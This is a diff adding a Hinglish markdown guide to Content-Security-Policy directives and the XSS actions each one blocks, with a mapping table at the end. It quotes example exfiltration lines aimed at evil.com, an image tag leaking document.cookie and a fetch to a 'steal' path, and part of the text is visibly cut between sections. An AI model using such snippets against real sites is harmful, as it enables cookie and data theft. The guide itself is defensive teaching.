@@ -1,0 +1,116 @@
+
+## 1️⃣ `default-src` (Base rule – sabka parent)
+
+👉 Agar koi specific directive define nahi hai, to ye apply hota hai.
+
+```http
+Content-Security-Policy: default-src 'self';
+```
+
+✔️ Sirf **same-origin** se sab kuch allowed  
+❌ External JS, image, API sab block
+
+---
+
+## 2️⃣ `script-src` (MOST IMPORTANT 🔥)
+
+👉 JavaScript execution control karta hai
+
+```http
+script-src 'self' https://cdn.example.com;
+```
+
+✔️ JS sirf same site + trusted CDN se  
+❌ XSS ke through evil JS block
+
+### ❌ Dangerous config
+
+```http
+script-src 'unsafe-inline' 'unsafe-eval';
+```
+
+➡️ Inline JS + eval allowed → **XSS heaven**
+
+---
+
+## 3️⃣ `style-src`
+
+👉 CSS files & inline styles control
+
+```http
+style-src 'self';
+```
+
+❌ `<style>` injection block  
+❌ `style="background:url(evil.com)"` block
+
+---
+
+## 4️⃣ `img-src` (Data exfiltration stop karta hai 🔥)
+
+👉 Image based cookie theft rokta hai
+
+```http
+img-src 'self';
+```
+
+❌
+
+```html
+<img src="https://evil.com/?c=document.cookie">
+```
+
+✔️ Browser hi request nahi bhejega
+
+---
+
+## 5️⃣ `connect-src` (VERY IMPORTANT 🔥🔥)
+
+👉 AJAX, fetch, XHR, WebSocket control
+
+```http
+connect-src 'self' https://api.example.com;
+```
+
+❌
+
+```js
+fetch("https://evil.com/steal");
+```
+
+➡️ **Blocked by CSP**
+
+---
+
+-uri` / `report-to` (Monitoring)
+
+👉 CSP violation report server ko bhejta hai
+
+```http
+report-uri /csp-report;
+```
+
+✔️ SOC / Blue team ke liye gold
+
+---
+
+## 1️⃣9️⃣ `require-trusted-types-for` (Advanced XSS defense)
+
+```http
+require-trusted-types-for 'script';
+```
+
+✔️ DOM XSS almost kill ho jata hai (Angular style)
+
+---
+
+# 🧠 Quick XSS + CSP Mapping (Important)
+
+|XSS Action|CSP Directive|
+|---|---|
+|`<script>` injection|`script-src`|
+|`fetch / xhr`|`connect-src`|
+|`<img>` cookie leak|`img-src`|
+|iframe injection|`frame-src`|
+|form hijack|`form-action`|
+|redirect|`navigate-to`|
